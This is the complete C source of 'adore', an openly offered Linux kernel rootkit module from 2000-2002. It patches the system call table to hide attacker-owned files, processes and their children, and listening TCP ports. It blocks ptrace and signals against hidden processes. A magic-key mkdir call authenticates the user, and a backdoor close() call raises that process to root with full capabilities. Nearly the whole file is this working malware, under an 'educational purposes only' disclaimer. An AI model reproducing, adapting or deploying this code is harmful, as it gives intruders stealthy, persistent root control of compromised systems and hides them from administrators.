/*** (C) 2000-2002 by Stealth
 ***
 *** http://spider.scorpions.net/~stealth
 *** http://stealth.7350.org/
 ***	
 ***
 *** (C)'ed Under a BSDish license. Please look at LICENSE-file.
 *** SO YOU USE THIS AT YOUR OWN RISK!
 *** YOU ARE ONLY ALLOWED TO USE THIS IN LEGAL MANNERS. 
 *** !!! FOR EDUCATIONAL PURPOSES ONLY !!!
 ***
 ***	-> Use ava to get all the things workin'.
 ***
 *** Greets fly out to all my friends. You know who you are. :)
 *** Special thanks to Shivan for granting root access to his
 *** SMP box for adore-development. More thx to skyper for also
 *** granting root access. Thanks to palmers for his p58 article.
 ***
 ***/
#define MODULE 
#define __KERNEL__


#ifdef MODVERSIONS
#include <linux/modversions.h>
#endif

#include <linux/config.h>
#include <linux/stddef.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/proc_fs.h>

#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/fs.h>

#include <linux/unistd.h>
#include <linux/string.h>
#include <sys/syscall.h>
#include <linux/dcache.h>

#include <linux/dirent.h>
#include <linux/file.h>
#include <asm/uaccess.h>
#include <linux/spinlock.h>
#include <linux/capability.h>
//#include <linux/threads.h>

#include "adore.h"

//void **sys_call_table = (void**)0xc02debb0;
extern void *sys_call_table[];

int (*o_getdents)(unsigned int, struct dirent *, unsigned int);
int (*o_kill)(int, int);
int (*o_fork)(struct pt_regs);
int (*o_clone)(struct pt_regs);
int (*o_close)(unsigned int);
long (*o_mkdir)(const char *, int);
int (*o_ptrace)(long, long, long, long);
long (*o_exit)(int);

int tcp_new_size();

#if LINUX_VERSION_CODE < LinuxVersionCode(2,4,0)
#define FILE_OPS ops->default_file_pos
#define INODE_OPS ops
#define file_list_lock()

rwlock_t tasklist_lock;	/* 2.2 has a bug and dosn't export this to modules */

int (*o_get_info_tcp)(char *, char **, off_t, int, int);
#else
#define FILE_OPS proc_fops
#define INODE_OPS proc_iops

get_info_t *o_get_info_tcp;
#endif

struct dentry *(*o_lookup_root)(struct inode *, struct dentry *);

#ifndef PID_MAX
#define PID_MAX 0x8000
#endif

char hidden_procs[PID_MAX/8+1];

inline void hide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] |= 1<<(x%8);
}

inline void unhide_proc(pid_t x)
{
	if (x >= PID_MAX)
		return;
	hidden_procs[x/8] &= ~(1<<(x%8));
}

inline char is_invisible(pid_t x)
{
	if (x >= PID_MAX)
		return 0;
	return hidden_procs[x/8]&(1<<(x%8));
}

#ifdef __SMP__
void adore_read_lock(rwlock_t *l)
{
	read_lock(l);
}

void adore_write_lock(rwlock_t *l)
{
	write_lock(l);
}

void adore_read_unlock(rwlock_t *l)
{
	read_unlock(l);
}

void adore_write_unlock(rwlock_t *l)
{
	write_unlock(l);
}

#else
void adore_read_lock(rwlock_t *l)
{
}

void adore_write_lock(rwlock_t *l)
{
}

void adore_read_unlock(rwlock_t *l)
{
}

void adore_write_unlock(rwlock_t *l)
{
}

#endif



/* base = 10 
 * Special atoi: makes "/proc/478" 478 */
int my_atoi(const char *str)
{
	int ret = 0, mul = 1;
	const char *ptr;
    
	for (ptr = str; *ptr; ptr++)
		;        
	ptr--;
        while (ptr >= str) {
		if (*ptr < '0' || *ptr > '9')
            		break;
		ret += (*ptr - '0') * mul;
		mul *= 10;
		ptr--;
	}
	return ret;
}

/* Own implementation of find_task_by_pid() */
struct task_struct *my_find_task(pid_t pid)
{
	struct task_struct *p;

	adore_read_lock(&tasklist_lock);	
	for_each_task(p) {
		if (p->pid == pid) {
			adore_read_unlock(&tasklist_lock);
			return p;
		}
	}
	adore_read_unlock(&tasklist_lock);
	return NULL;
}


/* Look whether a file, with inode# 'ino' is hidden */
int is_secret(struct super_block *sb, struct dirent *d)
{
	struct inode *inode;
	int ret;
	
	if (!sb || !d)
		return 0;
	
	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0)
		return 0;
	
	if ((inode = iget(sb, d->d_ino)) == NULL)
		return 0;
	down(&inode->i_sem);	
	
	/* Is it hidden ? */
	if (inode->i_uid == ELITE_UID && inode->i_gid == ELITE_GID)
		ret = 1;
	else
		ret = 0;

	up(&inode->i_sem);	
	iput(inode);
	return ret;
}
		
#ifdef __NR_getdents64

/* Look whether a file, with inode# 'ino' is hidden
 * 64 Bit version
 */
int is_secret64(struct super_block *sb, struct linux_dirent64 *d)
{
	struct inode *inode;
	int ret;

	if (!sb || !d)
		return 0;
	
	if (strcmp(d->d_name, ".") == 0 || strcmp(d->d_name, "..") == 0)
		return 0;

	if ((inode = iget(sb, d->d_ino)) == NULL)
		return 0;

	down(&inode->i_sem);	
	/* Is it hidden ? */
	if (inode->i_uid == ELITE_UID && inode->i_gid == ELITE_GID)
		ret = 1;
	else
		ret = 0;

	up(&inode->i_sem);
	iput(inode);
	return ret;
}
#endif // __NR_getdents64
	

/* Remove process from task-struct */
int remove_process(pid_t pid)
{
	struct task_struct *p;

	/* Nobody may mess with swapper+init */
	if (pid <= 1)
		return -1;

        if ((p = my_find_task(pid)) == NULL)
	        return -1;

	/* Must not have childs */
	if (p->p_cptr != NULL)
		return -1;

	adore_write_lock(&tasklist_lock);
	/* from sched.h */
	REMOVE_LINKS(p);
	adore_write_unlock(&tasklist_lock);
        return 0;
}



/* Set
 * PID to 0, making them disappear for proc's
 * get_pid_list(). */
int strip_invisible()
{
	struct task_struct *p;
	
	adore_read_lock(&tasklist_lock);
	for_each_task(p) {
		if (is_invisible(p->pid)) {
		
			/* temorary save PID in exit_code */
			p->exit_code = p->pid;
			p->pid = 0;
		}
	}
	adore_read_unlock(&tasklist_lock);
	return 0;
}

/* ditto (reverse) */
int unstrip_invisible()
{
	struct task_struct *p;
	
	adore_read_lock(&tasklist_lock);
	for_each_task(p) {
		if (is_invisible(p->pid)) {
			p->pid = p->exit_code;
			p->exit_code = 0;
		}
	}
	adore_read_unlock(&tasklist_lock);
	return 0;
}


/* remove all files from dirent, which are secret */
int n_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
	int ret, proc = 0, offset, r;

	struct file *file;
	char *ptr;
	struct dirent *curr, *prev = NULL, *d, *orig_d;
	struct super_block *sb;


	if ((file = fget(fd)) == NULL)
		return -EBADF;
	
	/* Fetch the right superblock for this directory (fd) */ 
	sb = file->f_dentry->d_sb;
    

	/* are we in /proc ? */
	if (sb->s_magic == PROC_SUPER_MAGIC)
		proc = 1;

/*#define USE_NEW_PROCS*/
/* define if you want to use new process hiding
 * technique */
#ifdef USE_NEW_PROCS	
	/* OK. if we are in proc, strip invisible processes */
	if (proc)
		strip_invisible();
#endif
	
	ret = o_getdents(fd, dirp, count);
	
	if (sb->s_magic == 0x1cd1) /* DEVPTS_SUPER_MAGIC */
		goto out;

#ifdef USE_NEW_PROCS
	/* Make them appear with normal PID again */
	if (proc)
		unstrip_invisible();
#endif
	
	if (ret <= 0)
		goto out;

	if ((d = kmalloc(ret, GFP_KERNEL)) == NULL)
		goto out;
	copy_from_user(d, dirp, ret);
	orig_d = d;
	
	ptr = (char*)d;	
	r = ret;
	
	while (ptr < (char *)orig_d + r) {
		curr = (struct dirent *)ptr;
		
		offset = curr->d_reclen;	/* offset to next entry */

#ifdef USE_NEW_PROCS
		if (is_secret(sb, curr)) {
#else
		if (is_secret(sb, curr) || (proc && is_invisible(my_atoi(curr->d_name)))) {
#endif
			if (!prev) {	/* if first entry is hidden 	*/
				ret -= offset;	/* cut it off		*/
				d = (struct dirent*)((char*)d + offset);
			} else {	/* not first		*/
				prev->d_reclen += offset;
				memset(curr, 0, offset);
			}
		} else
			prev = curr;
			
		ptr += offset;
		
	}
	copy_to_user(dirp, d, ret);
	kfree(orig_d);
out:
	fput(file);
	return ret;
}

#ifdef __NR_getdents64
/* remove all files from dirent, which are secret */
long n_getdents64(unsigned int fd, void *vp, unsigned int count)
{
	int ret, proc = 0, offset, r;

	struct file *file;
	char *ptr;
	struct linux_dirent64 *curr, *prev = NULL, *d, *orig_d, *dirp;
	struct super_block *sb;

	dirp = (struct linux_dirent64 *)vp;

	if ((file = fget(fd)) == NULL)
		return -EBADF;
	
	/* Fetch the right superblock for this directory (fd) */ 
	sb = file->f_dentry->d_sb;
    
	/* are we in /proc ? */
    	if (sb->s_magic == PROC_SUPER_MAGIC)
		proc = 1;

/*#define USE_NEW_PROCS*/
/* define if you want to use new process hiding
 * technique */
#ifdef USE_NEW_PROCS	
	/* OK. if we are in proc, strip invisible processes */
	if (proc)
		strip_invisible();
#endif
	
	ret = o_getdents64(fd, dirp, count);
	
	if (sb->s_magic == 0x1cd1) /* DEVPTS_SUPER_MAGIC */
		goto out;


#ifdef USE_NEW_PROCS
	/* Make them appear with normal PID again */
	if (proc)
		unstrip_invisible();
#endif
	
	if (ret <= 0)
		goto out;

	if ((d = kmalloc(ret, GFP_KERNEL)) == NULL)
		goto out;
	copy_from_user(d, dirp, ret);
	orig_d = d;
	
	ptr = (char*)d;	
	r = ret;
	
	while (ptr < (char *)orig_d + r) {
		curr = (struct linux_dirent64 *)ptr;
		
		offset = curr->d_reclen;	/* offset to next entry */

#ifdef USE_NEW_PROCS
		if (is_secret64(sb, curr)) {
#else
		if (is_secret64(sb, curr) || 
		    (proc && is_invisible(my_atoi(curr->d_name)))) {
#endif
			if (!prev) {	/* if first entry is hidden 	*/
				ret -= offset;	/* cut it off		*/
				d = (struct linux_dirent64*)((char*)d + offset);
			} else {		/* not first		*/
				prev->d_reclen += offset;
				memset(curr, 0, offset);
			}
		} else
			prev = curr;
			
		ptr += offset;
		
	}
	copy_to_user(dirp, d, ret);
	kfree(orig_d);
out:
	fput(file);
	return ret;
}

#endif /* __NR_getdents64 */

/* The new fork. Its task is to inherit the invisibility
 * to childs.
 */
int n_fork(struct pt_regs regs)
{
	pid_t pid;
	int hide = 0;
    
	if (is_invisible(current->pid))
    		++hide;
    
	pid = o_fork(regs);

	if (hide && pid >= 0)
    		hide_proc(pid);
	return pid;
}


int n_clone(struct pt_regs regs)
{
	pid_t pid;
	int hide = 0;
    
	if (is_invisible(current->pid))
		++hide;
    
	pid = o_clone(regs);
	if (hide && pid > 0)
		hide_proc(pid);
	return pid;
}


int n_kill(pid_t pid, int sig)
{
	struct task_struct *p;
	int ret = 0;

	
	if (sig != SIGINVISIBLE && sig != SIGVISIBLE && sig != SIGREMOVE) {
		/* If someone from outside try's to send signals to
		 * us, refuse (except init) */
		if (is_invisible(pid) && !is_invisible(current->pid) && 
		    current->pid != 1)
			ret = -ESRCH;
		else
			ret = o_kill(pid, sig);

		return ret;
	}
    
	/* authenticated? */
	if ((current->flags & PF_AUTH) != PF_AUTH) {
		ret = -ESRCH;
		goto out;
	}
		
	if ((p = my_find_task(pid)) == NULL) {
        	ret = -ESRCH;
		goto out;
	}
    
	if (current->uid && current->euid) {
		ret = -EPERM;
		goto out;
	}
    
	if (sig == SIGINVISIBLE) 
        	hide_proc(pid);
	else if (sig == SIGREMOVE)
		ret = remove_process(pid);
	else
        	unhide_proc(pid);

out:
	return ret;
}


/* Nobody should use ptrace() to bruteforce for hidden
 * processes. TODO: ia64 port
 */
int n_ptrace(long request, long pid, long addr, long data)
{
	if (is_invisible(pid))
		return -ESRCH;
	return o_ptrace(request, pid, addr, data);
}


/* The rootshell-backdoor */
int n_close(unsigned int fd)
{
	int r;
	
   	switch (fd) {
	case ELITE_CMD:
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = o_close(fd);
			break;
		}

    		/* Raise normal UID stuff ... */
		
		current->uid = 0;
		current->suid = 0;
		current->euid = 0;
    		current->gid = 0;
		current->egid = 0;
    		current->fsuid = 0;
		current->fsgid = 0;

		/* ... as well as capabilities */
		cap_set_full(current->cap_effective);
		cap_set_full(current->cap_inheritable);
		cap_set_full(current->cap_permitted);

		r = 0;
		break;

	/* to uninstall adore */
	case ELITE_CMD + 1:	
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = o_close(fd);
			break;
		}

		r = cleanup_module();
		break;

	/* to check whether adore is installed */
	case ELITE_CMD + 2:
		if ((current->flags & PF_AUTH) != PF_AUTH) {
			r = o_close(fd);
			break;
		}

		r = ADORE_VERSION;
		break;
	/* just the normal close() */
	default:
		r = o_close(fd);
		break;
	}
	return r;
}


/* "Authenticate" before you can use any adore functions */
long n_mkdir(const char *path, int mode)
{
	char key[64];
	long r, l;

	if ((l = strnlen_user(path, PATH_MAX)) < sizeof(key)) {
		memset(key, 0, sizeof(key));
		copy_from_user(key, path, l);

		if (strcmp(key, ADORE_KEY) == 0) {
			current->flags |= PF_AUTH;
			return 1;
		}
	}
	r = o_mkdir(path, mode);
	return r;
}


long n_exit(int x)
{
	long r = o_exit(x);
	unhide_proc(current->pid);
	return r;
}


struct proc_dir_entry *proc_find_tcp()
{
	struct proc_dir_entry *p = proc_net->subdir;

	while (strcmp(p->name, "tcp"))
		p = p->next;
	return p;
}

char *strnstr(const char *haystack, const char *needle, size_t n)
{
	char *s = strstr(haystack, needle);
	if (s == NULL)
		return NULL;
	if (s-haystack+strlen(needle) <= n)
		return s;
	else
		return NULL;
}

/* Reading from /proc/net/tcp gives back data in chunks
 * of NET_CHUNK. We try to match these against hidden ports
 * and remove them respectively
 */
#if LINUX_VERSION_CODE < LinuxVersionCode(2,4,0)
#define NET_CHUNK 128
int n_get_info_tcp(char *page, char **start, off_t pos, int count, int x)
#else
#define NET_CHUNK 150
int n_get_info_tcp(char *page, char **start, off_t pos, int count)
#endif
{
	int r = 0, i = 0, n = 0, hidden = 0;
	char port[10], *ptr, *mem, *it;

	/* Admin accessing beyond sizeof patched file? */
	if (pos >= tcp_new_size())
		return 0;
	
#if LINUX_VERSION_CODE < LinuxVersionCode(2,4,0)
	r = o_get_info_tcp(page, start, pos, count, x);
#else
	r = o_get_info_tcp(page, start, pos, count);
#endif
	if (r <= 0)// NET_CHUNK)
		return r;

	mem = (char *)kmalloc(r+NET_CHUNK+1, GFP_KERNEL);
	memset(mem, 0, r+NET_CHUNK+1);
	it = mem;

	/* If pos < NET_CHUNK then theres preamble which we can skip */
	if (pos >= NET_CHUNK) {
		ptr = page;
		n = (pos/NET_CHUNK) - 1;
	} else {
		memcpy(it, page, NET_CHUNK);
		it += NET_CHUNK;
		ptr = page + NET_CHUNK;
		n = 0;
	}

	for (; ptr < page+r; ptr += NET_CHUNK) {
		hidden = 0;
		for (i = 0; HIDDEN_SERVICES[i]; ++i) {
			sprintf(port, ":%04X", HIDDEN_SERVICES[i]);

			/* Ignore hidden blocks */
			if (strnstr(ptr, port, NET_CHUNK))
				hidden = 1;
		}
		if (!hidden) {
			sprintf(port, "%4d:", n);
			strncpy(ptr, port, strlen(port));
			memcpy(it, ptr, NET_CHUNK);
			it += NET_CHUNK;
			++n;
		}
	}

	memcpy(page, mem, r);
	n = strlen(mem);
	/* If we shrinked buffer, patch length */
	if (r > n)
		r = n-(*start-page);
	if (r < 0)
		r = 0;

	*start = page + (*start-page);

	kfree(mem);
	return r;
}


/* Calculate size of patched /proc/net/tcp */
int tcp_new_size()
{
	int r, l = 0, hits = 0, i = 0;
	char page[NET_CHUNK*10+1], *start, *ptr, port[10];

	for (;;) {

		memset(page, 0, sizeof(page));
#if LINUX_VERSION_CODE < LinuxVersionCode(2,4,0)
		r = o_get_info_tcp(page, &start, l, sizeof(page)-1, 0);//XXX 0?
#else
		r = o_get_info_tcp(page, &start, l, sizeof(page)-1);
#endif

		if (r <= 0)
			break;
		l += r;
		for (ptr = start; ptr < start+r; ptr += NET_CHUNK) {
			for (i = 0; HIDDEN_SERVICES[i]; ++i) {
				sprintf(port, ":%04X", HIDDEN_SERVICES[i]);
				if (strnstr(ptr, port, NET_CHUNK)) {
					++hits;
					break;
				}
			}
		}
	}
	return l - hits*NET_CHUNK;
}


struct dentry *n_lookup_root(struct inode *dir, struct dentry *dent)
{
	if (is_invisible(my_atoi(dent->d_iname)) && !is_invisible(current->pid))
		return NULL;
	return o_lookup_root(dir, dent);
}

int init_module(void)
{
	struct task_struct *p = current;
	struct proc_dir_entry *pde = NULL;


    	EXPORT_NO_SYMBOLS;
	memset(hidden_procs, 0, sizeof(hidden_procs));

	adore_read_lock(&tasklist_lock);

	/* Fill in init_hook (Eisbein mit Sauerkraut :) */
	for (; p->pid != 1; p = p->next_task)
		;
	init_hook = p;
	adore_read_unlock(&tasklist_lock);

	pde = proc_find_tcp();

	o_get_info_tcp = pde->get_info;
	pde->get_info = n_get_info_tcp;
	o_lookup_root = proc_root.INODE_OPS->lookup;
	proc_root.INODE_OPS->lookup = n_lookup_root;


#define REPLACE(x) o_##x = sys_call_table[__NR_##x];\
			sys_call_table[__NR_##x] = n_##x

	REPLACE(getdents);
	REPLACE(kill);
   	REPLACE(fork);
	REPLACE(clone); 
   	REPLACE(close); 
	REPLACE(mkdir);
	REPLACE(ptrace);
	REPLACE(exit);

#ifdef __NR_getdents64
	REPLACE(getdents64);
#endif

	return 0;
}


int cleanup_module(void)
{

	proc_find_tcp()->get_info = o_get_info_tcp;
	proc_root.INODE_OPS->lookup = o_lookup_root;

#define RESTORE(x) sys_call_table[__NR_##x] = o_##x

	RESTORE(getdents);
	RESTORE(kill);
	RESTORE(fork);
	RESTORE(clone);
	RESTORE(close);
	RESTORE(mkdir);
	RESTORE(ptrace);
	RESTORE(exit);

#ifdef __NR_getdents64
	RESTORE(getdents64);
#endif

	return 0;
}

